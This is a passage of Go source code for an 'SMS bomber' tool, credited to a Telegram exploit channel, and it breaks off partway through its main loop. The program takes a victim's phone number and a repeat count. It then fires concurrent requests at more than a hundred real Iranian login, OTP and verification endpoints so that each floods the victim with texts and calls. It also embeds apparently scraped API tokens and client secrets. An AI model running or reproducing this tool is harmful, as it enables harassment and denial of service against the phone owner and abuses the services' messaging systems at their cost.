package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"time"
)

/*
Channel telegram : @esfelurm or @Team_Exploit
===============================================
Link Github : https://github.com/esfelurm
===============================================
Sms Bomber pro v1
*/
func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}
func sms(url string, header map[string]interface{}, ch chan<- int) {
	//time.Sleep(3 * time.Second)
	jsonData, err := json.Marshal(header)
	if err != nil {
		fmt.Println("\033[01;31m[-] Error ! ")
		ch <- http.StatusInternalServerError
		return
	}
	time.Sleep(3 * time.Second)
	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
	time.Sleep(3 * time.Second)
	if err != nil {
		fmt.Println("\033[01;31m[-] Error ! ")
		ch <- http.StatusInternalServerError
		return
	}
	ch <- resp.StatusCode
}

func main() {
	// red := "\033[01;31m"
	// green := "\033[01;32m"
	// yellow := "\033[01;33m"
	clearScreen()
	fmt.Println("\033[01;33m")
	fmt.Println(` 
                                :-.                                   
                         .:   =#-:-----:                              
                           **%@#%@@@#*+==:                            
                       :=*%@@@@@@@@@@@@@@%#*=:                        
                    -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.                    
                . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:                  
              .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.                
             =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:               
            :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.              
            #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..              
           .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.              
           =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#              
           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:             
           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-             
           .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:             
            #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#              
            -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:              
             *@@%#            -@@@@@@.            #@@@+               
             .%@@# @esfelurm  +@@@@@@= Sms Bomber #@@#                
              :@@*           =%@@@@@@%-           *@@:                
              #@@%         .*@@@@#%@@@%+.         %@@+                
              %@@@+      -#@@@@@* :%@@@@@*-      *@@@*                
              *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=                
               #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*                 
                =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-                  
                  .---@@@@@@@@@%@@@%%@@@@@@@@%:--.                    
                      #@@@@@@@@@@@@@@@@@@@@@@+                        
                       *@@@@@@@@@@@@@@@@@@@@+                         
                        +@@%*@@%@@@%%@%*@@%=                          
                         +%+ %%.+@%:-@* *%-                           
                          .  %# .%#  %+                               
                             :.  %+  :.                               
                                 -:                                                                                                                                                            												 

	`)
	var phone string
	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
	fmt.Scan(&phone)

	var repeatCount int
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;36m")
	fmt.Scan(&repeatCount)

	ch := make(chan int)

	for i := 0; i < repeatCount; i++ {
		go sms("https://3tex.io/api/1/users/validation/mobile", map[string]interface{}{
			"receptorPhone": phone,
		}, ch)
		go sms("https://deniizshop.com/api/v1/sessions/login_request", map[string]interface{}{
			"mobile_phone": phone,
		}, ch)
		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
			"userKey": phone,
		}, ch)
		go sms("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", map[string]interface{}{
			"cellphone": phone,
		}, ch)
		go sms("https://bck.behtarino.com/api/v1/users/phone_verification/", map[string]interface{}{
			"phone": phone,
		}, ch)
		go sms("https://abantether.com/users/register/phone/send/", map[string]interface{}{
			"phoneNumber": phone,
		}, ch)
		s57 := fmt.Sprintf("phone=%s&call=yes", phone)
		go sms("https://novinbook.com/index.php?route=account/phone", map[string]interface{}{
			s57: phone,
		}, ch)
		go sms(fmt.Sprintf("https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code?phoneNumber=%s", phone), map[string]interface{}{
			"esfelurm": "esfelurm",
		}, ch)
		go sms("https://api.pooleno.ir/v1/auth/check-mobile", map[string]interface{}{
			"mobile": phone,
		}, ch)
		go sms("https://agent.wide-app.ir/auth/token", map[string]interface{}{
			"'grant_type': 'otp', 'client_id': '62b30c4af53e3b0cf100a4a0', 'phone'": phone,
		}, ch)
		sm := fmt.Sprintf("'credential': {'phoneNumber': %s, 'role': 'PASSENGER'}", phone)
		go sms("https://tap33.me/api/v2/user", map[string]interface{}{
			sm: phone,
		}, ch)
		go sms("https://web.emtiyaz.app/json/login", map[string]interface{}{
			"send=1&cellphone=": phone,
		}, ch)
		go sms("https://api.divar.ir/v5/auth/authenticate", map[string]interface{}{
			"phone": phone,
		}, ch)
		se := fmt.Sprintf("'api_version': '3', 'method': 'sendCode', 'data': {'phone_number': %s, 'send_type': 'SMS'}", phone)
		go sms("https://messengerg2c4.iranlms.ir/", map[string]interface{}{
			se: phone,
		}, ch)
		go sms("https://nx.classino.com/otp/v1/api/login", map[string]interface{}{
			"mobile": phone,
		}, ch)
		go sms("https://bama.ir/signin-checkforcellnumber", map[string]interface{}{
			"cellNumber=": phone,
		}, ch)
		go sms("https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.0&UDID=39c62f64-3d2d-4954-9033-816098559ae4&locale=fa", map[string]interface{}{
			"cellphone": phone,
		}, ch)
		go sms("https://ws.alibaba.ir/api/v3/account/mobile/otp", map[string]interface{}{
			"phoneNumber": phone,
		}, ch)
		// go sms("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0", map[string]interface{}{
		// 	"":phone}, ch)
		go sms("https://api.bitbarg.com/api/v1/authentication/registerOrLogin", map[string]interface{}{
			"phone": phone,
		}, ch)
		go sms("https://api.bahramshop.ir/api/user/validate/username", map[string]interface{}{
			"username": phone,
		}, ch)
		go sms("https://mobapi.banimode.com/api/v2/auth/request", map[string]interface{}{
			"phone": phone,
		}, ch)
		go sms("https://takshopaccessorise.ir/api/v1/sessions/login_request", map[string]interface{}{
			"mobile_phone": phone,
		}, ch)
		go sms("https://api.bitpin.ir/v1/usr/sub_phone/", map[string]interface{}{
			"phone=": phone,
		}, ch)
		go sms("https://chamedoon.com/api/v1/membership/guest/request_mobile_verification", map[string]interface{}{
			"mobile": phone,
		}, ch)
		go sms("https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL", map[string]interface{}{
			"mobile": phone,
		}, ch)
		go sms("https://pinket.com/api/cu/v2/phone-verification", map[string]interface{}{
			"phoneNumber": phone,
		}, ch)
		go sms("https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode", map[string]interface{}{
			"userName": phone,
		}, ch)
		go sms("https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile", map[string]interface{}{
			"mobile": phone,
		}, ch)
		go sms("https://bit24.cash/app/api/auth/check-mobile", map[string]interface{}{
			"mobile": phone,
		}, ch)
		go sms("https://app.itoll.ir/api/v1/auth/login", map[string]interface{}{
			"mobile": phone,
		}, ch)
		go sms("https://api.raybit.net:3111/api/v1/authentication/register/mobile", map[string]interface{}{
			"mobile": phone,
		}, ch)
		go sms("https://www.pubisha.com/login/checkCustomerActivation", map[string]interface{}{
			"mobile=": phone,
		}, ch)
		go sms("https://farvi.shop/api/v1/sessions/login_request", map[string]interface{}{
			"mobile_phone": phone,
		}, ch)
		go sms("https://gw.taaghche.com/v4/site/auth/signup", map[string]interface{}{
			"contact": phone,
		}, ch)
		go sms("https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request", map[string]interface{}{
			"UserName": phone,
		}, ch)
		go sms("https://www.sheypoor.com/auth", map[string]interface{}{
			"username": phone,
		}, ch)
		go sms("https://api.snapp.ir/api/v1/sms/link", map[string]interface{}{
			"phone": phone,
		}, ch)
		go sms("https://a4baz.com/api/web/login", map[string]interface{}{
			"cellphone": phone,
		}, ch)
		go sms("https://api.anargift.com/api/people/auth", map[string]interface{}{
			"user": phone,
		}, ch)
		go sms("https://nobat.ir/api/public/patient/login/phone", map[string]interface{}{
			"mobile": phone,
		}, ch)
		go sms("https://www.buskool.com/send_verification_code", map[string]interface{}{
			"phone": phone,
		}, ch)
		go sms("https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode", map[string]interface{}{
			"'Parameters': {'ApplicationType': 'Web','ApplicationUniqueToken': None, 'ApplicationVersion': '1.0.0','MobileNumber': +": phone,
		}, ch)
		go sms("https://www.simkhanapi.ir/api/users/registerV2", map[string]interface{}{
			"mobileNumber": phone,
		}, ch)
		go sms("https://sandbox.sibirani.ir/api/v1/user/invite", map[string]interface{}{
			"username": phone,
		}, ch)
		go sms("https://shop.hyperjan.ir/api/users/manage", map[string]interface{}{
			"mobile": phone,
		}, ch)
		go sms("https://api.digikala.com/v1/user/authenticate/", map[string]interface{}{
			"username": phone,
		}, ch)
		go sms("https://hiword.ir/wp-json/otp-login/v1/login", map[string]interface{}{
			"identifier": phone,
		}, ch)
		go sms("https://abantether.com/users/register/phone/send/", map[string]interface{}{
			"phoneNumber": phone,
		}, ch)
		go sms("https://api.bit24.cash/api/v3/auth/check-mobile", map[string]interface{}{
			"mobile": phone,
		}, ch)
		go sms("https://dicardo.com/main/sendsms", map[string]interface{}{
			"phone": phone,
		}, ch)
		go sms("https://ghasedak24.com/user/ajax_register", map[string]interface{}{
			"username": phone,
		}, ch)
		go sms("https://tikban.com/Account/LoginAndRegister", map[string]interface{}{
			"CellPhone": phone,
		}, ch)
		go sms("https://www.digistyle.com/users/login-register/", map[string]interface{}{
			"loginRegister[email_phone]": phone,
		}, ch)
		go sms("https://banankala.com/home/login", map[string]interface{}{
			"Mobile": phone,
		}, ch)
		go sms("https://www.iranketab.ir/account/register", map[string]interface{}{
			"UserName": phone,
		}, ch)
		go sms("https://ketabchi.com/api/v1/auth/requestVerificationCode", map[string]interface{}{
			"phoneNumber": phone,
		}, ch)
		go sms("https://www.offdecor.com/index.php?route=account/login/sendCode", map[string]interface{}{
			"phone": phone,
		}, ch)
		go sms("https://exo.ir/index.php?route=account/mobile_login", map[string]interface{}{
			"mobile_number": phone,
		}, ch)
		go sms("https://shahrfarsh.com/Account/Login", map[string]interface{}{
			"phoneNumber=": phone,
		}, ch)
		go sms("https://takfarsh.com/wp-content/themes/bakala/template-parts/send.php", map[string]interface{}{
			"phone_email": phone,
		}, ch)
		go sms("https://shop.beheshticarpet.com/my-account/", map[string]interface{}{
			"billing_mobile": phone,
		}, ch)
		go sms("https://www.khanoumi.com/accounts/sendotp", map[string]interface{}{
			"mobile": phone,
		}, ch)
		go sms("https://rojashop.com/api/auth/sendOtp", map[string]interface{}{
			"mobile": phone,
		}, ch)
		go sms("https://dadpardaz.com/advice/getLoginConfirmationCode", map[string]interface{}{
			"mobile": phone,
		}, ch)
		go sms("https://api.rokla.ir/api/request/otp", map[string]interface{}{
			"mobile": phone,
		}, ch)
		go sms("https://khodro45.com/api/v1/customers/otp/", map[string]interface{}{
			"mobile": phone,
		}, ch)
		go sms("https://mashinbank.com/api2/users/check", map[string]interface{}{
			"mobileNumber": phone,
		}, ch)
		go sms("https://api.pezeshket.com/core/v1/auth/requestCode", map[string]interface{}{
			"mobileNumber": phone,
		}, ch)
		go sms("https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{
			"'method': 'phone', 'identifier'": phone,
		}, ch)
		go sms("https://api.timcheh.com/auth/otp/send", map[string]interface{}{
			"mobile": phone,
		}, ch)
		go sms("https://client.api.paklean.com/user/resendCode", map[string]interface{}{
			"username": phone,
		}, ch)
		go sms("https://mobogift.com/signin", map[string]interface{}{
			"username": phone,
		}, ch)
		go sms("https://api.iranicard.ir/api/v1/register", map[string]interface{}{
			"mobile": phone,
		}, ch)
		go sms("https://tj8.ir/auth/register", map[string]interface{}{
			"mobile": phone,
		}, ch)
		go sms("https://mashinbank.com/api2/users/check", map[string]interface{}{
			"mobileNumber": phone,
		}, ch)
		go sms("https://cinematicket.org/api/v1/users/signup", map[string]interface{}{
			"phone_number": phone,
		}, ch)
		go sms("https://www.irantic.com/api/login/request", map[string]interface{}{
			"mobile": phone,
		}, ch)
		go sms("https://kafegheymat.com/shop/getLoginSms", map[string]interface{}{
			"phone": phone,
		}, ch)
		go sms("https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6&optionalVersion=5.6.6&UDID=bb65d956-f88b-4fec-9911-5f94391edf85", map[string]interface{}{
			"cellphone": phone,
		}, ch)
		go sms("https://www.delino.com/user/register", map[string]interface{}{
			"mobile": phone,
		}, ch)
		go sms("https://alopeyk.com/api/sms/send.php", map[string]interface{}{
			"phone": phone,
		}, ch)
		go sms("https://1401api.tamland.ir/api/user/signup", map[string]interface{}{
			"Mobile": phone,
		}, ch)
		go sms("https://shop.opco.co.ir/index.php?route=extension/module/login_verify/update_register_code", map[string]interface{}{
			"telephone": phone,
		}, ch)
		go sms("https://api.digikalajet.ir/user/login-register/", map[string]interface{}{
			"phone": phone,
		}, ch)
		go sms("https://melix.shop/site/api/v1/user/otp", map[string]interface{}{
			"mobile": phone,
		}, ch)
		go sms("https://safiran.shop/login", map[string]interface{}{
			"mobile": phone,
		}, ch)
		go sms("https://restaurant.delino.com/user/register", map[string]interface{}{
			"'apiToken':'VyG4uxayCdv5hNFKmaTeMJzw3F95sS9DVMXzMgvzgXrdyxHJGFcranHS2mECTWgq','clientSecret':'7eVdaVsYXUZ2qwA9yAu7QBSH2dFSCMwq','device':'web','username'": phone,
		}, ch)
		go sms("https://garcon.tandori.ir/users/v1/main/login", map[string]interface{}{
			"phone": phone,
		}, ch)
		go sms("https://dastkhat-isad.ir/api/v1/user/store", map[string]interface{}{
			"mobile": phone,
		}, ch)
		go sms("https://irwco.ir/register", map[string]interface{}{
			"mobile": phone,
		}, ch)
		go sms("https://api.sibbank.ir/v1/auth/login", map[string]interface{}{
			"phone_number": phone,
		}, ch)
		go sms("https://api.snapp.ir/api/v1/sms/link", map[string]interface{}{
			"phone": phone,
		}, ch)
		go sms("https://www.miare.ir/api/otp/driver/request/", map[string]interface{}{
			"phone_number": phone,
		}, ch)
		go sms("https://api.arshiyan.com/send_code", map[string]interface{}{
			"'country_code':'98','phone_number'": phone,
		}, ch)
		go sms("https://backend.topnoor.ir/web/v1/user/otp", map[string]interface{}{
			"mobile": phone,
		}, ch)
		go sms("https://api.alinance.com/user/register/mobile/send/", map[string]interface{}{
			"phone_number": phone,
		}, ch)
		go sms("https://api.alopeyk.com/safir-service/api/v1/login", map[string]interface{}{
			"phone": phone,
		}, ch)

		go sms("https://api.dadhesab.ir/user/entry", map[string]interface{}{
			"username": phone,
		}, ch)
		go sms("https://app.dosma.ir/sendverify/", map[string]interface{}{
			"username": phone,
		}, ch)
		go sms("https://api.ehteraman.com/api/request/otp", map[string]interface{}{
			"mobile": phone,
		}, ch)
		go sms("https://api-ebcom.mci.ir/services/auth/v1.0/otp", map[string]interface{}{
			"msisdn": phone,
		}, ch)
		go sms("https://api.hbbs.ir/authentication/SendCode", map[string]interface{}{
			"MobileNumber": phone,
		}, ch)
		go sms("https://api.iranamlaak.net/authenticate/send/otp/to/mobile/via/sms", map[string]interface{}{
			"AgencyMobile": phone,
		}, ch)
		go sms("https://api.kcd.app/api/v1/auth/login", map[string]interface{}{
			"mobile": phone,
		}, ch)
		go sms("https://mazoocandle.ir/login", map[string]interface{}{
			"phone": phone,
		}, ch)
		go sms("https://api.ostadkr.com/login", map[string]interface{}{
			"mobile": phone,
		}, ch)
		go sms("https://api.paymishe.com/api/v1/otp/registerOrLogin", map[string]interface{}{
			"mobile": phone,
		}, ch)
		go sms("https://api.rayshomar.ir/api/Register/RegistrMobile", map[string]interface{}{
			"MobileNumber": phone,
		}, ch)
		go sms("https://refahtea.ir/wp-admin/admin-ajax.php", map[string]interface{}{
			"mobile": phone,
		}, ch)
		go sms("https://digitalsignup.snapp.ir/oauth/drivers/api/v1/otp", map[string]interface{}{
			"cellphone": phone,
		}, ch)
		go sms("https://mamifood.org/Registration.aspx/SendValidationCode", map[string]interface{}{
			"Phone": phone,
		}, ch)
		go sms("https://server.uphone.ir/api/v1/login/otp/request", map[string]interface{}{
			"mobile": phone,
		}, ch)
		go sms("https://abantether.com/users/register/phone/send/", map[string]interface{}{
			"phoneNumber": phone,
		}, ch)
		go sms("https://www.glite.ir/wp-admin/admin-ajax.php", map[string]interface{}{
			"action=logini_first&login": phone,
		}, ch)
		go sms("https://novinbook.com/index.php?route=account/phone", map[string]interface{}{
			"phone": phone,
		}, ch)
		go sms("https://api.offch.com/auth/otp", map[string]interface{}{
			"username": phone,
		}, ch)
		go sms("https://sandbox.sibbazar.com/api/v1/user/invite", map[string]interface{}{
			"username": phone,
		}, ch)
		go sms("https://sabziman.com/wp-admin/admin-ajax.php", map[string]interface{}{
			"action=newphoneexist&phonenumber=": phone,
		}, ch)
		go sms("https://api.watchonline.shop/api/v1/otp/request", map[string]interface{}{
			"mobile": phone,
		}, ch)
		s1 := fmt.Sprintf("'phoneNumber':%s ,'email':''", phone)
		go sms("https://abantether.com/users/register/phone/send/", map[string]interface{}{
			s1: phone,
		}, ch)
		s2 := fmt.Sprintf("'userKey':'98-'%s ,'userKeyType': 1", phone)
		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
			s2: phone,
		}, ch)
		s3 := fmt.Sprintf("'api_version': '3', 'method': 'sendCode', 'data': {'phone_number': %s, 'send_type': 'SMS'}", phone)
		go sms("https://shadmessenger12.iranlms.ir/", map[string]interface{}{
			s3: phone,
		}, ch)
		s4 := fmt.Sprintf("'grant_type':'otp','client_id':'62b30c4af53e3b0cf100a4a0','phone': %s", phone)
		go sms("https://agent.wide-app.ir/auth/token", map[string]interface{}{
			s4: phone,
		}, ch)
		s5 := fmt.Sprintf("'credential': {'phoneNumber': %s, 'role': 'PASSENGER'}", phone)
		go sms("https://tap33.me/api/v2/user", map[string]interface{}{
			s5: phone,
		}, ch)
		s8 := fmt.Sprintf("'operationName':'Mutation','variables':{'content':{'phone_number':%s,query':'mutation Mutation($content: MerchantRegisterOTPSendContent) {\n  merchantRegister {\n    otpSend(content: $content)\n    __typename\n  }\n}'", phone)
		go sms("https://apollo.digify.shop/graphql", map[string]interface{}{
			s8: phone,
		}, ch)
		go sms(fmt.Sprintf("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=%v", phone), map[string]interface{}{
			"esfelurm": "esfelurm",
		}, ch)
		go sms(fmt.Sprintf("https://auth.mrbilit.com/api/login/exists/v2?mobileOrEmail=%v&source=2&sendTokenIfNot=true", phone), map[string]interface{}{
			"esfelurm": "esfelurm",
		}, ch)
		s10 := fmt.Sprintf("'mobile': %s, 'country_code': 'IR', 'provider_code': 'RUBIKA'", phone)
		go sms("https://api.chartex.net/api/v2/user/validate", map[string]interface{}{
			s10: phone,
		}, ch)
		s11 := fmt.Sprintf("'lang': 'fa', 'country_id': '860', 'password': 'snaptrippass', 'mobile_phone': %s, 'country_code': '+98', 'email': 'example@gmail.com'}", phone)
		go sms("https://www.snapptrip.com/register", map[string]interface{}{
			s11: phone,
		}, ch)
		go sms(fmt.Sprintf("https://api-v2.filmnet.ir/access-token/users/%v/otp", phone), map[string]interface{}{
			"esfelurm": "esfelurm",
		}, ch)
		s13 := fmt.Sprintf("'phone': %s,'captcha_token': ''", phone)
		go sms("https://api.bitpin.ir/v1/usr/sub_phone/", map[string]interface{}{
			s13: phone,
		}, ch)
		s14 := fmt.Sprintf("'mobile': %s,'origin': '/'','referrer_id': ''", phone)
		go sms("https://chamedoon.com/api/v1/membership/guest/request_mobile_verification", map[string]interface{}{
			s14: phone,
		}, ch)
		s15 := fmt.Sprintf("'mobile': %s, 'country_code': '+98'", phone)
		go sms("https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile", map[string]interface{}{
			s15: phone,
		}, ch)
		s16 := fmt.Sprintf("'mobile':%s,'side':'web'", phone)
		go sms("https://api.raybit.net:3111/api/v1/authentication/register/mobile", map[string]interface{}{
			s16: phone,
		}, ch)
		go sms(fmt.Sprintf("https://api.torob.com/a/phone/send-pin/?phone_number=%s", phone), map[string]interface{}{
			"esfelurm": "esfelurm",
		}, ch)
		go sms("https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request", map[string]interface{}{
			"UserName": phone,
		}, ch)
		go sms("https://gw.taaghche.com/v4/site/auth/signup", map[string]interface{}{
			"contact": phone,
		}, ch)
		go sms(fmt.Sprintf("https://core.gap.im/v1/user/add.json?mobile=%2B%s", phone), map[string]interface{}{
			"esfelurm": "esfelurm",
		}, ch)
		s18 := fmt.Sprintf("'cellNumber': %s, 'device': {'deviceId': 'a16e6255-17c3-431b-b047-3f66d24c286f', 'deviceModel': 'WEB_BROWSER', 'deviceAPI': 'WEB_BROWSER', 'osName': 'WEB'}", phone)
		go sms("https://app.mydigipay.com/digipay/api/users/send-sms", map[string]interface{}{
			s18: phone,
		}, ch)
		s19 := fmt.Sprintf("'phone': %s, 'recaptcha-response': '03AGdBq25IQtuwqOIeqhl7Tx1EfCGRcNLW8DHYgdHSSyYb0NUwSj5bwnnew9PCegVj2EurNyfAHYRbXqbd4lZo0VJTaZB3ixnGq5aS0BB0YngsP0LXpW5TzhjAvOW6Jo72Is0K10Al_Jaz7Gbyk2adJEvWYUNySxKYvIuAJluTz4TeUKFvgxKH9btomBY9ezk6mxnhBRQeMZYasitt3UCn1U1Xhy4DPZ0gj8kvY5B0MblNpyyjKGUuk_WRiS_6DQsVd5fKaLMy76U5wBQsZDUeOVDD9CauPUR4W_cNJEQP1aPloEHwiLJtFZTf-PVjQU-H4fZWPvZbjA2txXlo5WmYL4GzTYRyI4dkitn3JmWiLwSdnJQsVP0nP3wKN0LV3D7DjC5kDwM0EthEz6iqYzEEVD-s2eeWKiqBRfTqagbMZQfW50Gdb6bsvDmD2zKV8nf6INvfPxnMZC95rOJdHOY-30XGS2saIzjyvg','token': 'e622c330c77a17c8426e638d7a85da6c2ec9f455'}, headers={'Host': 'gateway.wisgoon.com','content-length': '582','accept': 'application/json','save-data': 'on','content-type': 'application/json','origin': 'https://m.wisgoon.com','sec-fetch-site': 'same-site','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.wisgoon.com/','accept-encoding': 'gzip, deflate, br','accept-language': 'en-GB,en-US;q\u003d0.9,en;q\u003d0.8,fa;q\u003d0.7'", phone)
		go sms("https://gateway.wisgoon.com/api/v1/auth/login/", map[string]interface{}{
			s19: phone,
		}, ch)
		s20 := fmt.Sprintf("utf8=%E2%9C%93&phone_number=%s&g-recaptcha-response=", phone)
		go sms("https://tagmond.com/phone_number", map[string]interface{}{
			s20: phone,
		}, ch)
		s21 := fmt.Sprintf("'mobile': %s, 'country_id': 205", phone)
		go sms("https://api.doctoreto.com/api/web/patient/v1/accounts/register", map[string]interface{}{
			s21: phone,
		}, ch)
		s22 := fmt.Sprintf("'user': phone, 'app_id': 99", phone)
		go sms("https://api.anargift.com/api/people/auth", map[string]interface{}{
			s22: phone,
		}, ch)
		go sms(fmt.Sprintf("https://www.azki.com/api/core/app/user/checkLoginAvailability/%7B'phoneNumber':'azki_%v'%7D", phone), map[string]interface{}{
			"esfelurm": "esfelurm",
		}, ch)
		s23 := fmt.Sprintf("'_token': 'mXBVe062llzpXAxD5EzN4b5yqrSuWJMVPl1dFTV6','mobile': %s,'password': 'ibvvb@3#9nc'", phone)
		go sms("https://lendo.ir/register?", map[string]interface{}{
			s23: phone,
		}, ch)
		s24 := fmt.Sprintf("'contactInfo[mobile]': %s,'contactInfo[agreementAccepted]': '1','contactInfo[teachingFieldId]': '1','contactInfo[eduGradeIds][7]': '7','submit_register': '1'", phone)
		go sms("https://www.olgoobooks.ir/sn/userRegistration/?&requestedByAjax=1&elementsId=userRegisterationBox", map[string]interface{}{
			s24: phone,
		}, ch)
		s25 := fmt.Sprintf("'action=digits_check_mob&countrycode=%2B98&mobileNo=%s&csrf=fdaa7fc8e6&login=2&username=&email=&captcha=&captcha_ses=&json=1&whatsapp=0'", phone)
		go sms("https://www.pakhsh.shop/wp-admin/admin-ajax.php", map[string]interface{}{
			s25: phone,
		}, ch)
		s26 := fmt.Sprintf("'variables': {'mobile': %s,'query': 'mutation verificationCodeRequest($mobile: MobileScalar!) { mobileVerificationCodeRequest(mobile: $mobile) { success } }'", phone)
		go sms("https://api.basalam.com/user", map[string]interface{}{
			s26: phone,
		}, ch)
		s27 := fmt.Sprintf("'mobile': %s,'action': 'sendsms'", phone)
		go sms("https://crm.see5.net/api_ajax/sendotp.php", map[string]interface{}{
			s27: phone,
		}, ch)
		s28 := fmt.Sprintf("'mobileNumber': %s,'ReSendSMS': 'False'", phone)
		go sms("https://www.simkhanapi.ir/api/users/registerV2", map[string]interface{}{
			s28: phone,
		}, ch)
		s29 := fmt.Sprintf("'mobileNumber': %s,'country': '1'", phone)
		go sms("https://my.limoome.com/api/auth/login/otp", map[string]interface{}{
			s29: phone,
		}, ch)
		s30 := fmt.Sprintf("_token=bBSxMx7ifcypKJuE8qQEhahIKpcVApWdfZXFkL8R&mobile=%s&recaptcha=", phone)
		go sms("https://www.mihanpezeshk.com/ConfirmCodeSbm_Patient", map[string]interface{}{
			s30: phone,
		}, ch)
		s32 := fmt.Sprintf("number=%s&state=number&", phone)
		go sms("https://i.devslop.app/app/ifollow/api/otp.php/", map[string]interface{}{
			s32: phone,
		}, ch)
		s33 := fmt.Sprintf("action=digits_check_mob&countrycode=%2B98&mobileNo=%s&csrf=3b4194a8bb&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_%D9%81%DB%8C%D9%84%D8%AF%D9%85%D8%AA%D9%86%DB%8C1642498931181=Nvgu&digregcode=%2B98&digits_reg_mail=%s&dig_otp=&code=&dig_reg_mail=&dig_nounce=3b4194a8bb", phone, phone)
		go sms("https://behzadshami.com/wp-admin/admin-ajax.php", map[string]interface{}{
			s33: phone,
		}, ch)
		s34 := fmt.Sprintf("'apiToken':'VyG4uxayCdv5hNFKmaTeMJzw3F95sS9DVMXzMgvzgXrdyxHJGFcranHS2mECTWgq','clientSecret':'7eVdaVsYXUZ2qwA9yAu7QBSH2dFSCMwq','device':'web','username':%s", phone)
		go sms("https://restaurant.delino.com/user/register", map[string]interface{}{
			s34: phone,
		}, ch)
		go sms("http://shop.tnovin.com/login", map[string]interface{}{
			"phone": phone,
		}, ch)
		s35 := fmt.Sprintf("'mobile':%s,'countryCode':98,'device_os':2", phone)
		go sms("https://dastkhat-isad.ir/api/v1/user/store", map[string]interface{}{
			s35: phone,
		}, ch)
		s36 := fmt.Sprintf("fullname=%D9%85%D9%85%D8%AF&phoneNumber=%s&register=", phone)
		go sms("https://hamlex.ir/register.php", map[string]interface{}{
			s36: phone,
		}, ch)
		s37 := fmt.Sprintf("againkey=%s&cache=false", phone)
		go sms("https://moshaveran724.ir/m/pms.php", map[string]interface{}{
			s37: phone,
		}, ch)
		s38 := fmt.Sprintf("'phone_number':%s,'os_type':'W'", phone)
		go sms("https://account.api.balad.ir/api/web/auth/login/", map[string]interface{}{
			s38: phone,
		}, ch)
		s39 := fmt.Sprintf("'userKey':%s,'userKeyType':1", phone)
		go sms("https://app.flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
			s39: phone,
		}, ch)
		s40 := fmt.Sprintf("mobile=%s&__RequestVerificationToken=lqpAP86cm6ubwUoSRlGeHdrLJ90KhrBSHzLZ7_rAQ5dAZT-q__KWOkJ3TRoPtz8Q13HaLVCmcfsB1itFNtrvVbX0xWE1", phone)
		go sms("https://www.foodcenter.ir/account/sabtmobile", map[string]interface{}{
			s40: phone,
		}, ch)

		s41 := fmt.Sprintf("'mobileOrEmail':%s,'deviceCode':'d520c7a8-421b-4563-b955-f5abc56b97ec','firstName':'','lastName':'','password':''", phone)
		go sms("https://auth.homtick.com/api/V1/User/GetVerifyCode", map[string]interface{}{
			s41: phone,
		}, ch)
		s42 := fmt.Sprintf("'optype':15,'userid':0,'mobile':%s,'firstname':'','lastname':'','cityid':0,'email':'','birthdate':'','gender':'False','avatarid':0,'packagename':'','versioncode':-1,'tokenkey':'','username':'','password':'','connectionname':'MainConStr'", phone)
		go sms("https://app.kardoon.ir:4433/api/users", map[string]interface{}{
			s42: phone,
		}, ch)
		s43 := fmt.Sprintf("'phoneNumber':%s,'email':''", phone)
		go sms("https://abantether.com/users/register/phone/send/", map[string]interface{}{
			s43: phone,
		}, ch)
